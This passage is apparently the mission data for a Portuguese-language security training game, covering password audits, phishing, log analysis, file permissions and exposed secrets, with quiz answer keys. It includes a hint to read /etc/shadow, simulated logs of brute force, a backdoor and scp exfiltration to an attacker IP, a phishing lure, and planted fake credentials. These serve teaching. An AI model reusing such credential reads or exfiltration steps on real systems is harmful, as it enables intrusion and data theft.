const missionsData = [
  {
    id: 1,
    titulo: "Senhas Vulneráveis",
    subtitulo: "Auditoria de credenciais do sistema",
    dificuldade: "Fácil",
    tipo: "terminal",
    pontos_maximos: 100,
    icone: "🔑",
    contexto: `Você foi contratado pela empresa <strong>TechCorp Ltda</strong> para realizar uma auditoria de segurança.
O administrador concedeu acesso limitado ao servidor para que você possa verificar as credenciais dos usuários.
Sua missão: <strong>analisar as contas do sistema e identificar problemas de segurança nas senhas</strong>.`,
    dica: "Use o comando <code>cat /home/contas.txt</code> para visualizar as contas do sistema.",
    filesystem: {
      "/": ["home", "var", "etc"],
      "/home": ["contas.txt", "usuarios"],
      "/home/usuarios": ["joao", "maria", "admin", "root"],
      "/var": ["log"],
      "/var/log": ["auth.log", "syslog"],
      "/etc": ["passwd", "shadow"],
    },
    files: {
      "/home/contas.txt": `# =============================================
# TechCorp - Arquivo de Contas do Sistema
# CONFIDENCIAL - Apenas para administradores
# =============================================

USUARIO          SENHA            ULTIMO_ACESSO
--------         --------         --------
admin            admin123         2024-01-15 09:22
joao.silva       senha@2024       2024-01-14 18:45
maria.costa      qwerty           2024-01-13 11:30
roberto.tech     R#7mK$p2@nL9x    2024-01-15 10:15
guest            guest            2024-01-10 08:00
root             toor             2024-01-15 07:00

NOTA: Trocar senhas no próximo ciclo de auditoria.`,
      "/home/usuarios/admin": "[diretório home do admin]",
      "/home/usuarios/joao": "[diretório home de joao]",
      "/var/log/auth.log": `Jan 15 09:22:01 servidor sshd[1234]: Accepted password for admin from 192.168.1.50
Jan 15 09:22:05 servidor sshd[1234]: Accepted password for admin from 203.0.113.45
Jan 15 09:22:08 servidor sshd[1234]: Accepted password for admin from 198.51.100.22
Jan 15 09:22:11 servidor sshd[1235]: Accepted password for admin from 185.220.101.3
Jan 15 09:22:14 servidor sshd[1236]: Accepted password for admin from 45.142.212.100`,
      "/etc/passwd": `root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
joao.silva:x:1001:1001::/home/joao:/bin/bash
maria.costa:x:1002:1002::/home/maria:/bin/bash
roberto.tech:x:1003:1003::/home/roberto:/bin/bash
guest:x:1004:1004::/home/guest:/bin/sh`,
      "/etc/shadow": `[ACESSO NEGADO] Permissão insuficiente para ler /etc/shadow
Tente: sudo cat /etc/shadow`,
      "/var/log/syslog": `Jan 15 09:00:01 servidor cron[998]: (root) CMD (/usr/sbin/backup.sh)
Jan 15 09:15:00 servidor kernel: Network interface eth0 up
Jan 15 09:20:00 servidor systemd[1]: Started Session c1 of user admin.`
    },
    perguntas: [
      {
        id: 1,
        texto: "Após analisar o arquivo de contas, qual usuário possui a senha MAIS FRACA e representa o maior risco imediato?",
        opcoes: [
          { id: "a", texto: "joao.silva — senha@2024" },
          { id: "b", texto: "admin — admin123" },
          { id: "c", texto: "maria.costa — qwerty" },
          { id: "d", texto: "roberto.tech — R#7mK$p2@nL9x" }
        ],
        correta: "b",
        pontos: 30,
        feedback_correto: "Correto! 'admin123' é extremamente previsível. É uma das senhas mais usadas no mundo e seria quebrada em segundos por qualquer ferramenta de brute force.",
        feedback_errado: "Não exatamente. Embora outras senhas também sejam fracas, 'admin123' para o usuário 'admin' é a combinação mais crítica — é a primeira que qualquer atacante tentaria."
      },
      {
        id: 2,
        texto: "Analisando o auth.log, o que o padrão de acesso do usuário 'admin' indica?",
        opcoes: [
          { id: "a", texto: "Acesso normal de um funcionário trabalhando remotamente" },
          { id: "b", texto: "A conta foi comprometida — múltiplos IPs diferentes em segundos indica acesso malicioso" },
          { id: "c", texto: "O sistema está com problemas de autenticação dupla" },
          { id: "d", texto: "O firewall está bloqueando conexões repetidas" }
        ],
        correta: "b",
        pontos: 35,
        feedback_correto: "Excelente análise! Logins bem-sucedidos de 5 IPs diferentes com intervalo de 3 segundos é impossível para um humano. Indica claramente que a senha foi comprometida e um bot está usando a conta.",
        feedback_errado: "Observe os timestamps e os IPs no log. Cinco logins de IPs completamente diferentes em menos de 15 segundos é fisicamente impossível para um humano — é claramente acesso automatizado malicioso."
      },
      {
        id: 3,
        texto: "Qual medida deve ser tomada IMEDIATAMENTE para mitigar o risco identificado?",
        opcoes: [
          { id: "a", texto: "Apenas enviar um e-mail para os usuários pedindo para trocar a senha" },
          { id: "b", texto: "Desativar o SSH temporariamente, forçar troca de todas as senhas fracas e implementar autenticação por chave SSH" },
          { id: "c", texto: "Aumentar o limite de tentativas de login falhas" },
          { id: "d", texto: "Registrar o incidente e analisar semana que vem" }
        ],
        correta: "b",
        pontos: 35,
        feedback_correto: "Perfeito! Resposta a incidente correta: isolar, remediar, fortalecer. Desativar SSH limita o dano imediato, forçar troca de senhas elimina o acesso não autorizado, e chaves SSH eliminam senhas como vetor de ataque.",
        feedback_errado: "A urgência não foi adequadamente avaliada. Com uma conta comprometida ativa, cada segundo conta. A ação deve ser imediata e multifacetada: desabilitar acesso, forçar reset de credenciais e fortalecer a autenticação."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A empresa TechCorp armazenava senhas em texto plano em um arquivo acessível, e o usuário 'admin' utilizava a senha 'admin123'. Um atacante descobriu a senha (possivelmente via força bruta ou vazamento) e está acessando o sistema de múltiplos IPs.",
      vulnerabilidade: "Senhas fracas e previsíveis (admin123, qwerty, guest, toor) combinadas com armazenamento de senhas em texto plano.",
      risco: "Comprometimento total do sistema — o usuário 'admin' tem privilégios elevados. O atacante pode instalar malware, exfiltrar dados, criar backdoors ou causar danos irreparáveis.",
      como_corrigir: "1. Nunca armazene senhas em texto plano — use hashing com bcrypt/Argon2\n2. Implemente política de senhas fortes (mínimo 12 caracteres, maiúsculas, números, símbolos)\n3. Use autenticação por chave SSH em vez de senhas\n4. Implemente 2FA para contas privilegiadas\n5. Monitore e alerte sobre logins de múltiplos IPs",
      boa_pratica: "NIST SP 800-63B recomenda: senhas longas (passhrases), verificação contra listas de senhas comprometidas (HaveIBeenPwned), e autenticação multifator para sistemas críticos."
    }
  },

  {
    id: 2,
    titulo: "Detectando Phishing",
    subtitulo: "Análise de e-mail suspeito",
    dificuldade: "Fácil",
    tipo: "email",
    pontos_maximos: 100,
    icone: "📧",
    contexto: `Você é analista de segurança na empresa <strong>DataSafe Corp</strong>.
Uma funcionária do financeiro, <strong>Ana Pereira</strong>, encaminhou um e-mail suspeito que recebeu.
Ela estava prestes a clicar no link quando percebeu algo estranho.
<strong>Analise o e-mail e identifique todos os indicadores de phishing.</strong>`,
    dica: "Examine cuidadosamente: remetente, links, urgência, solicitações incomuns.",
    emails: [
      {
        de: "seguranca@banco-brasil-online.net",
        para: "ana.pereira@datasafe.com.br",
        assunto: "⚠️ URGENTE: Sua conta foi suspensa — Ação necessária em 24h",
        data: "Seg, 15 Jan 2024 08:47:23",
        corpo: `Prezado(a) Cliente,

Detectamos atividades SUSPEITAS em sua conta bancária.
Para sua segurança, sua conta foi TEMPORARIAMENTE SUSPENSA.

Para reativar sua conta e evitar o cancelamento permanente,
clique IMEDIATAMENTE no link abaixo:

→ http://banco-brasil-seguro-login.xyz/reativar?token=7f3k2m

Você tem apenas 24 HORAS para completar a verificação.
Após este prazo, sua conta será PERMANENTEMENTE encerrada
e todos os seus fundos serão bloqueados por 90 dias.

Para verificar sua identidade, você precisará fornecer:
• Número da conta e agência
• CPF completo
• Senha atual e nova senha
• Número do cartão e CVV

Esta é uma mensagem automática do sistema de segurança.
Não responda este e-mail.

Atenciosamente,
Departamento de Segurança
Banco do Brasil S.A.

------
Este e-mail foi enviado para ana.pereira@datasafe.com.br
© 2024 Banco do Brasil - Todos os direitos reservados
CNPJ: 00.000.000/0001-91`
      }
    ],
    perguntas: [
      {
        id: 1,
        texto: "Qual é o PRINCIPAL indicador de que este é um e-mail de phishing?",
        opcoes: [
          { id: "a", texto: "O e-mail foi enviado na segunda-feira cedo" },
          { id: "b", texto: "O domínio do remetente é 'banco-brasil-online.net' — não é o domínio oficial do banco" },
          { id: "c", texto: "O e-mail menciona atividade suspeita" },
          { id: "d", texto: "O e-mail tem formatação com emojis" }
        ],
        correta: "b",
        pontos: 30,
        feedback_correto: "Correto! O domínio legítimo do Banco do Brasil é bb.com.br. 'banco-brasil-online.net' é um domínio falso criado para enganar. Este é o indicador mais crítico.",
        feedback_errado: "O domínio do remetente é o indicador mais crítico. O Banco do Brasil usa '@bb.com.br'. 'banco-brasil-online.net' é um domínio fraudulento registrado especificamente para ataques de phishing."
      },
      {
        id: 2,
        texto: "O e-mail solicita que Ana forneça CVV e senhas. Como um banco legítimo nunca agiria?",
        opcoes: [
          { id: "a", texto: "Enviaria um e-mail informando sobre transações" },
          { id: "b", texto: "Solicitaria senha, CVV e dados completos do cartão por e-mail" },
          { id: "c", texto: "Pediria para acessar o internet banking oficial" },
          { id: "d", texto: "Notificaria sobre atividade suspeita" }
        ],
        correta: "b",
        pontos: 35,
        feedback_correto: "Exato! Nenhuma instituição financeira legítima jamais solicita senha, CVV, ou dados completos de cartão por e-mail. Isso é uma regra universal de segurança bancária.",
        feedback_errado: "Bancos legítimos NUNCA solicitam senha, PIN, CVV ou dados completos de cartão por qualquer canal digital. Esta é uma regra fundamental — qualquer solicitação assim é fraude."
      },
      {
        id: 3,
        texto: "Qual técnica psicológica o atacante está usando para pressionar a vítima a agir sem pensar?",
        opcoes: [
          { id: "a", texto: "Reciprocidade — oferece algo em troca" },
          { id: "b", texto: "Criação de urgência artificial e medo de perda" },
          { id: "c", texto: "Prova social — menciona outros clientes" },
          { id: "d", texto: "Autoridade técnica — usa jargão técnico" }
        ],
        correta: "b",
        pontos: 35,
        feedback_correto: "Perfeito! Urgência artificial ('24 horas'), ameaça de perda ('conta encerrada', 'fundos bloqueados') são técnicas clássicas de engenharia social para suprimir o pensamento crítico.",
        feedback_errado: "Analise as frases: 'apenas 24 HORAS', 'PERMANENTEMENTE encerrada', 'bloqueados por 90 dias'. Isso é criação de urgência e medo — a principal técnica de engenharia social usada em phishing."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um atacante enviou um e-mail se passando pelo Banco do Brasil usando um domínio falso (banco-brasil-online.net). O objetivo era coletar credenciais bancárias, número de cartão e CVV — dados suficientes para fraude financeira completa.",
      vulnerabilidade: "E-mail de phishing explorando engenharia social: urgência artificial, domínio falso similar ao legítimo, e solicitação de dados sensíveis.",
      risco: "Se Ana tivesse clicado e fornecido os dados, o atacante teria acesso completo à conta bancária dela, podendo realizar transferências, compras e roubo de identidade.",
      como_corrigir: "1. Sempre verifique o domínio do remetente (não apenas o nome)\n2. Nunca clique em links de e-mails urgentes — acesse o site digitando diretamente\n3. Bancos nunca pedem senha por e-mail\n4. Reporte e-mails suspeitos ao departamento de segurança\n5. Implemente filtros anti-phishing e treinamento contínuo",
      boa_pratica: "Implemente treinamento de conscientização de segurança (Security Awareness Training) para todos os funcionários. Simule campanhas de phishing internamente para medir e melhorar a resiliência humana."
    }
  },

  {
    id: 3,
    titulo: "Análise de Logs",
    subtitulo: "Detectando acesso suspeito",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "📋",
    contexto: `Você é o analista de segurança (SOC L1) da empresa <strong>InfoSec Dynamics</strong>.
Às 03:00 da madrugada, um alerta automático foi disparado no SIEM.
Você precisa <strong>analisar os logs de autenticação</strong> e determinar o que aconteceu.
O servidor crítico afetado hospeda o sistema de folha de pagamento.`,
    dica: "Use <code>cat /var/log/auth.log</code> e <code>cat /var/log/access.log</code> para analisar os registros.",
    filesystem: {
      "/": ["var", "home", "etc", "opt"],
      "/var": ["log"],
      "/var/log": ["auth.log", "access.log", "fail2ban.log", "syslog"],
      "/home": ["soc-analyst"],
      "/etc": ["hosts", "passwd"],
      "/opt": ["scripts"]
    },
    files: {
      "/var/log/auth.log": `Jan 15 02:47:01 srv-payroll sshd[4521]: Failed password for root from 45.142.212.100 port 51234 ssh2
Jan 15 02:47:03 srv-payroll sshd[4522]: Failed password for root from 45.142.212.100 port 51235 ssh2
Jan 15 02:47:05 srv-payroll sshd[4523]: Failed password for root from 45.142.212.100 port 51236 ssh2
Jan 15 02:47:07 srv-payroll sshd[4524]: Failed password for root from 45.142.212.100 port 51237 ssh2
Jan 15 02:47:09 srv-payroll sshd[4525]: Failed password for admin from 45.142.212.100 port 51238 ssh2
Jan 15 02:47:11 srv-payroll sshd[4526]: Failed password for admin from 45.142.212.100 port 51239 ssh2
Jan 15 02:47:13 srv-payroll sshd[4527]: Failed password for administrator from 45.142.212.100 port 51240 ssh2
Jan 15 02:47:15 srv-payroll sshd[4528]: Failed password for user from 45.142.212.100 port 51241 ssh2
Jan 15 02:47:17 srv-payroll sshd[4529]: Failed password for user from 45.142.212.100 port 51242 ssh2
Jan 15 02:47:19 srv-payroll sshd[4530]: Failed password for oracle from 45.142.212.100 port 51243 ssh2
Jan 15 02:47:21 srv-payroll sshd[4531]: Failed password for postgres from 45.142.212.100 port 51244 ssh2
Jan 15 02:47:23 srv-payroll sshd[4532]: Failed password for ftpuser from 45.142.212.100 port 51245 ssh2
Jan 15 02:47:25 srv-payroll sshd[4533]: Failed password for deploy from 45.142.212.100 port 51246 ssh2
Jan 15 02:47:27 srv-payroll sshd[4534]: Failed password for backup from 45.142.212.100 port 51247 ssh2
Jan 15 02:47:29 srv-payroll sshd[4535]: Failed password for backup from 45.142.212.100 port 51248 ssh2
Jan 15 02:47:31 srv-payroll sshd[4536]: Failed password for backup from 45.142.212.100 port 51249 ssh2
Jan 15 02:47:33 srv-payroll sshd[4537]: Accepted password for backup from 45.142.212.100 port 51250 ssh2
Jan 15 02:47:38 srv-payroll sshd[4538]: pam_unix(sshd:session): session opened for user backup
Jan 15 02:51:12 srv-payroll sshd[4539]: session closed for user backup
Jan 15 09:15:00 srv-payroll sshd[5000]: Accepted password for carlos.admin from 192.168.1.10 port 52100 ssh2`,
      "/var/log/access.log": `45.142.212.100 - - [15/Jan/2024:02:47:33 +0000] "GET /api/employees HTTP/1.1" 200 48291
45.142.212.100 - - [15/Jan/2024:02:47:39 +0000] "GET /api/employees/payroll HTTP/1.1" 200 192834
45.142.212.100 - - [15/Jan/2024:02:47:45 +0000] "GET /api/employees/payroll?export=csv HTTP/1.1" 200 2847291
45.142.212.100 - - [15/Jan/2024:02:48:02 +0000] "GET /api/config/database HTTP/1.1" 200 1024
45.142.212.100 - - [15/Jan/2024:02:51:08 +0000] "POST /api/admin/backdoor HTTP/1.1" 201 256
192.168.1.10 - - [15/Jan/2024:09:15:05 +0000] "GET /dashboard HTTP/1.1" 200 8192`,
      "/var/log/fail2ban.log": `2024-01-15 02:47:00,001 fail2ban.jail  [WARNING] ssh: 45.142.212.100 not yet banned (5/10)
2024-01-15 02:47:10,003 fail2ban.jail  [WARNING] ssh: 45.142.212.100 not yet banned (10/10)
2024-01-15 02:47:20,005 fail2ban.jail  [NOTICE]  ssh: Banning 45.142.212.100 after 10 failures
2024-01-15 02:47:20,010 fail2ban.jail  [ERROR]   Ban command failed: iptables not responding
2024-01-15 02:47:30,015 fail2ban.jail  [WARNING] Ban enforcement FAILED for 45.142.212.100`,
      "/var/log/syslog": `Jan 15 02:47:33 srv-payroll kernel: New USB device found
Jan 15 02:51:10 srv-payroll cron[1000]: (backup) CMD (tar -czf /tmp/.hidden_backup.tar.gz /var/www/html/api/)
Jan 15 02:51:11 srv-payroll scp[4540]: sent file /tmp/.hidden_backup.tar.gz to 45.142.212.100`,
      "/etc/hosts": `127.0.0.1 localhost
127.0.1.1 srv-payroll
192.168.1.1 gateway
192.168.1.10 workstation-carlos`,
      "/etc/passwd": `root:x:0:0:root:/root:/bin/bash
backup:x:1004:1004:Backup User:/home/backup:/bin/bash
carlos.admin:x:1001:1001:Carlos Admin:/home/carlos:/bin/bash`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual tipo de ataque está claramente representado no auth.log entre 02:47:01 e 02:47:29?",
        opcoes: [
          { id: "a", texto: "Ataque de phishing via SSH" },
          { id: "b", texto: "Ataque de força bruta / credential stuffing automatizado" },
          { id: "c", texto: "Ataque Man-in-the-Middle na conexão SSH" },
          { id: "d", texto: "Exploração de vulnerabilidade no OpenSSH" }
        ],
        correta: "b",
        pontos: 40,
        feedback_correto: "Correto! Múltiplas tentativas falhas (16 em 28 segundos) com nomes de usuário diferentes (root, admin, administrator, backup...) do mesmo IP é um ataque de força bruta dicionário automatizado.",
        feedback_errado: "Observe: 16 tentativas em 28 segundos, IP único, nomes de usuário comuns (root, admin, backup, oracle...). Este padrão é inequivocamente um ataque de força bruta com wordlist automatizado."
      },
      {
        id: 2,
        texto: "Qual foi a consequência MAIS GRAVE identificada nos logs?",
        opcoes: [
          { id: "a", texto: "O usuário 'backup' falhou várias vezes ao tentar logar" },
          { id: "b", texto: "O atacante acessou com sucesso, exportou dados de folha de pagamento e instalou um backdoor" },
          { id: "c", texto: "O fail2ban registrou um alerta de segurança" },
          { id: "d", texto: "O sistema ficou lento por causa das tentativas de login" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Análise perfeita! O atacante conseguiu: (1) Login com 'backup' às 02:47:33, (2) Exportou toda a folha de pagamento via /api/employees/payroll?export=csv, (3) Acessou config do banco de dados, (4) Instalou um backdoor em /api/admin/backdoor, (5) Exfiltrou dados via SCP.",
        feedback_errado: "Releia access.log e syslog com atenção. Após o login bem-sucedido às 02:47:33, há: exportação de dados de folha (2.8MB), acesso a config de BD, criação de backdoor, e exfiltração de arquivo via scp para o IP atacante."
      },
      {
        id: 3,
        texto: "Por que o fail2ban falhou em bloquear o ataque?",
        opcoes: [
          { id: "a", texto: "O fail2ban estava desativado no servidor" },
          { id: "b", texto: "O comando de ban falhou porque o iptables não estava respondendo" },
          { id: "c", texto: "O fail2ban bloqueou o IP corretamente" },
          { id: "d", texto: "O atacante usou um IP diferente para cada tentativa" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Exato! O fail2ban.log mostra 'Ban command failed: iptables not responding'. O fail2ban detectou o ataque e tentou banir o IP, mas o iptables (firewall) estava com problema — a defesa falhou por uma dependência quebrada.",
        feedback_errado: "Leia o fail2ban.log: 'Ban command failed: iptables not responding'. O fail2ban detectou o ataque e tentou agir, mas o iptables estava inoperante. Isso demonstra a importância de monitorar a saúde das ferramentas de segurança."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Um ataque de força bruta automatizado originou-se do IP 45.142.212.100. Após 16 tentativas falhadas, o atacante adivinhou a senha do usuário 'backup'. O fail2ban falhou por problemas no iptables. O atacante então exfiltrou dados sensíveis de folha de pagamento (2.8MB), acessou configurações do banco de dados e instalou um backdoor.",
      vulnerabilidade: "Múltiplas falhas: senha fraca para usuário 'backup', iptables inoperante, usuário 'backup' com acesso à API de folha de pagamento, ausência de alertas em tempo real, sem MFA.",
      risco: "Violação grave de dados: dados pessoais e salariais de todos os funcionários expostos, backdoor instalado para acesso futuro, credenciais do banco de dados comprometidas, violação da LGPD.",
      como_corrigir: "1. Bloqueie o IP atacante imediatamente\n2. Desative e analise o backdoor instalado\n3. Revogue e recrie todas as credenciais\n4. Corrija o iptables e teste o fail2ban\n5. Implemente MFA para SSH\n6. Use chaves SSH — desabilite login por senha\n7. Restrinja o usuário 'backup' ao mínimo de permissões",
      boa_pratica: "Princípio do mínimo privilégio: cada usuário deve ter acesso apenas ao necessário. Contas de serviço (backup) não devem ter acesso a dados sensíveis. Implemente SIEM com alertas em tempo real para tentativas de força bruta."
    }
  },

  {
    id: 4,
    titulo: "Permissões Incorretas",
    subtitulo: "Corrigindo o controle de acesso",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "🔒",
    contexto: `Você foi chamado para auditar o servidor web da empresa <strong>WebDev Solutions</strong>.
O cliente reportou que dados confidenciais podem estar acessíveis por usuários não autorizados.
<strong>Analise as permissões dos arquivos</strong> e identifique os problemas de controle de acesso.`,
    dica: "Use <code>ls -la /var/www/html/</code> para ver permissões. O formato é: tipo+dono+grupo+outros.",
    filesystem: {
      "/": ["var", "home", "etc"],
      "/var": ["www"],
      "/var/www": ["html"],
      "/var/www/html": ["index.php", "config.php", "admin", "uploads", ".htpasswd", "backup.sql"],
      "/var/www/html/admin": ["panel.php", "users.php", "config_admin.php"],
      "/home": ["www-data", "dev1"],
      "/etc": ["apache2"]
    },
    files: {
      "/var/www/html/config.php": `<?php
// Configurações do banco de dados — NÃO EXPOR!
define('DB_HOST', 'localhost');
define('DB_NAME', 'producao_db');
define('DB_USER', 'root');
define('DB_PASS', 'SuperSecret@2024!');
define('DB_PORT', '3306');

// Chave da API de pagamentos
define('PAYMENT_API_KEY', 'sk_live_xK9mL2pQ7nR4sT8wY1zA3bC');

// Token JWT secreto
define('JWT_SECRET', 'minha_chave_super_secreta_jwt_123');

// Modo debug (DESATIVAR em produção!)
define('DEBUG_MODE', true);
?>`,
      "/var/www/html/backup.sql": `-- Backup do banco de dados — 2024-01-10
-- ARQUIVO CONFIDENCIAL
CREATE TABLE usuarios (id, nome, email, senha_hash, cpf, cartao_credito);
INSERT INTO usuarios VALUES
(1, 'João Silva', 'joao@empresa.com', 'hash...', '123.456.789-00', '4532-xxxx-xxxx-1234'),
(2, 'Maria Costa', 'maria@empresa.com', 'hash...', '987.654.321-00', '5412-xxxx-xxxx-5678');
-- 2.847 registros totais`,
      "/var/www/html/.htpasswd": `admin:$apr1$kT2mN$encrypted_password_hash
webmaster:$apr1$pL9nR$another_hash`,
      "ls -la /var/www/html/": `total 156
drwxrwxrwx 3 www-data www-data  4096 Jan 15 09:00 .
drwxr-xr-x 3 root     root      4096 Jan 10 08:00 ..
-rwxrwxrwx 1 www-data www-data  8291 Jan 15 08:55 index.php
-rwxrwxrwx 1 www-data www-data   847 Jan 14 17:30 config.php
-rwxrwxrwx 1 www-data www-data    96 Jan 12 10:00 .htpasswd
-rwxrwxrwx 1 www-data www-data 94827 Jan 10 08:30 backup.sql
drwxrwxrwx 2 www-data www-data  4096 Jan 15 09:00 admin
drwxrwxrwx 2 www-data www-data  4096 Jan 15 09:00 uploads`,
      "ls -la /var/www/html/admin/": `total 24
drwxrwxrwx 2 www-data www-data 4096 Jan 15 09:00 .
drwxrwxrwx 3 www-data www-data 4096 Jan 15 09:00 ..
-rwxrwxrwx 1 www-data www-data 2841 Jan 14 16:00 panel.php
-rwxrwxrwx 1 www-data www-data 1923 Jan 13 11:00 users.php
-rwxrwxrwx 1 www-data www-data  512 Jan 14 16:00 config_admin.php`
    },
    perguntas: [
      {
        id: 1,
        texto: "Ao executar 'ls -la /var/www/html/', qual é o problema CRÍTICO nas permissões?",
        opcoes: [
          { id: "a", texto: "Os arquivos pertencem ao usuário www-data — isso é normal" },
          { id: "b", texto: "Todos os arquivos e diretórios têm permissão 777 (rwxrwxrwx) — qualquer usuário do sistema pode ler, escrever e executar" },
          { id: "c", texto: "O diretório uploads existe sem necessidade" },
          { id: "d", texto: "Os arquivos PHP não têm extensão .html" }
        ],
        correta: "b",
        pontos: 40,
        feedback_correto: "Correto! Permissão 777 significa que QUALQUER usuário do sistema (dono, grupo, e outros) pode ler, modificar e executar esses arquivos. Para um servidor web, isso é catastrófico.",
        feedback_errado: "Observe o padrão 'rwxrwxrwx' em todos os arquivos. Isso significa permissão 777: leitura+escrita+execução para TODOS os usuários. Qualquer conta comprometida no servidor tem acesso total a todos esses arquivos."
      },
      {
        id: 2,
        texto: "O arquivo 'config.php' com permissão 777 representa qual risco?",
        opcoes: [
          { id: "a", texto: "Apenas estético — as permissões não afetam a segurança do PHP" },
          { id: "b", texto: "Qualquer usuário do servidor pode ler credenciais do banco, chave da API de pagamentos e secret JWT" },
          { id: "c", texto: "O PHP não consegue ler arquivos com permissão 777" },
          { id: "d", texto: "O servidor web fica mais lento com permissões excessivas" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Perfeito! O config.php contém senha do banco de dados (root), chave da API de pagamentos REAL (sk_live_...) e secret JWT. Com 777, qualquer processo ou usuário comprometido no servidor pode ler esse arquivo e comprometer toda a aplicação.",
        feedback_errado: "Leia o conteúdo do config.php: senha do BD como root, chave real da API de pagamentos (sk_live_), secret JWT. Com permissão 777, qualquer usuário ou processo malicioso no servidor pode ler esses segredos críticos."
      },
      {
        id: 3,
        texto: "Qual conjunto de permissões é CORRETO para o config.php em um servidor web de produção?",
        opcoes: [
          { id: "a", texto: "chmod 777 config.php — acesso total para todos" },
          { id: "b", texto: "chmod 644 config.php — dono lê/escreve, grupo e outros só leem" },
          { id: "c", texto: "chmod 640 config.php — dono lê/escreve, grupo lê, outros sem acesso" },
          { id: "d", texto: "chmod 400 config.php — apenas dono lê, ninguém mais" }
        ],
        correta: "c",
        pontos: 60,
        feedback_correto: "Excelente! chmod 640 é ideal: dono (www-data) pode ler/escrever, grupo pode ler (para o processo PHP), outros não têm acesso nenhum. Para segredos extremamente críticos, 600 (apenas dono lê) seria ainda melhor.",
        feedback_errado: "Para config.php com credenciais: chmod 640 (rw-r-----) é adequado. O dono (www-data) precisa ler/escrever, o grupo do processo web precisa ler, e OUTROS não devem ter NENHUM acesso. Nunca use 777 ou 644 para arquivos de configuração com credenciais."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O servidor web tinha todos os arquivos e diretórios com permissão 777 — acesso total para qualquer usuário. Isso expôs credenciais do banco de dados, chaves de API de pagamento reais, secrets JWT, um backup SQL com CPFs e dados de cartão, e credenciais .htpasswd.",
      vulnerabilidade: "Controle de acesso inadequado (OWASP A01:2021). Permissões 777 em todos os arquivos, arquivos sensíveis (backup.sql, config.php) acessíveis publicamente via web, credenciais hardcoded nos arquivos.",
      risco: "Comprometimento total: banco de dados acessível, API de pagamentos comprometida, tokens JWT forjáveis, dados pessoais de clientes expostos (violação LGPD), credenciais de admin disponíveis.",
      como_corrigir: "chmod 750 para diretórios, chmod 640 para arquivos PHP, chmod 400 para config.php\nMova config.php para fora do webroot\nNunca armazene backups SQL no webroot\nUse variáveis de ambiente para credenciais (não hardcode)\nBloqueie acesso web a arquivos .htpasswd e .sql via .htaccess",
      boa_pratica: "Princípio do mínimo privilégio aplicado a sistema de arquivos: o processo web deve ter apenas as permissões estritamente necessárias. Use ferramentas como 'find /var/www -perm 777' regularmente para auditoria de permissões."
    }
  },

  {
    id: 5,
    titulo: "Dados Sensíveis Expostos",
    subtitulo: "Encontrando informações vazadas",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "🔍",
    contexto: `Você está realizando um pentest autorizado na aplicação web da <strong>FinanceApp Ltda</strong>.
Durante a fase de reconhecimento, você precisa verificar se dados sensíveis estão sendo
expostos indevidamente na aplicação ou em suas configurações.
<strong>Investigue o servidor e identifique os vazamentos de dados.</strong>`,
    dica: "Explore os diretórios do servidor. Arquivos de configuração, logs e código-fonte são fontes comuns de vazamento.",
    filesystem: {
      "/": ["var", "home", "opt", "tmp"],
      "/var": ["www", "log"],
      "/var/www": ["html"],
      "/var/www/html": ["app", ".git", "docker-compose.yml", ".env"],
      "/var/www/html/app": ["api.php", "payment.php", "README.md"],
      "/var/www/html/.git": ["config", "COMMIT_EDITMSG"],
      "/var/log": ["nginx", "app.log"],
      "/var/log/nginx": ["access.log", "error.log"],
      "/tmp": [".temp_tokens", "debug.log"]
    },
    files: {
      "/var/www/html/.env": `# Configuração da aplicação FinanceApp
# NUNCA commitar este arquivo!

APP_ENV=production
APP_DEBUG=true
APP_KEY=base64:xK9mL2pQ7nR4sT8wY1zA3bCdEfGhIjKl

DB_CONNECTION=mysql
DB_HOST=db.financeapp.internal
DB_PORT=3306
DB_DATABASE=financeapp_prod
DB_USERNAME=financeapp_user
DB_PASSWORD=FinApp@Prod#2024!

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=financeapp-prod-backups

STRIPE_SECRET_KEY=sk_live_EXEMPLO_EDUCACIONAL_NAO_REAL
STRIPE_WEBHOOK_SECRET=whsec_examplewebhooksecret

REDIS_PASSWORD=redis_prod_password_2024

JWT_SECRET=finance_jwt_super_secret_key_2024`,
      "/var/www/html/.git/config": `[core]
    repositoryformatversion = 0
    filemode = true
[remote "origin"]
    url = https://github.com/financeapp/backend-private
    fetch = +refs/heads/*:refs/remote/origin/*
[user]
    email = dev@financeapp.com
    name = DevOps Team`,
      "/var/www/html/.git/COMMIT_EDITMSG": `fix: remove hardcoded prod credentials from config.php

accidentally committed DB_PASSWORD and STRIPE_KEY in previous commit
this removes them but they are still in git history!`,
      "/var/www/html/docker-compose.yml": `version: '3'
services:
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: root_super_secret_2024
      MYSQL_DATABASE: financeapp_prod
      MYSQL_USER: financeapp_user
      MYSQL_PASSWORD: FinApp@Prod#2024!
  redis:
    image: redis:alpine
    command: redis-server --requirepass redis_prod_password_2024`,
      "/tmp/debug.log": `[2024-01-15 03:22:11] DEBUG: Payment request
[2024-01-15 03:22:11] DEBUG: User: joao@email.com | CPF: 123.456.789-00
[2024-01-15 03:22:11] DEBUG: Card: 4111111111111111 | CVV: 123 | Exp: 12/26
[2024-01-15 03:22:11] DEBUG: Stripe token: tok_visa_debit_example
[2024-01-15 03:22:15] DEBUG: Payment approved: R$ 1.299,90
[2024-01-15 03:22:15] DEBUG: Transaction ID: ch_example123`,
      "/tmp/.temp_tokens": `session_tokens_active:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin_token.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.user_12345.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.user_67890.signature`,
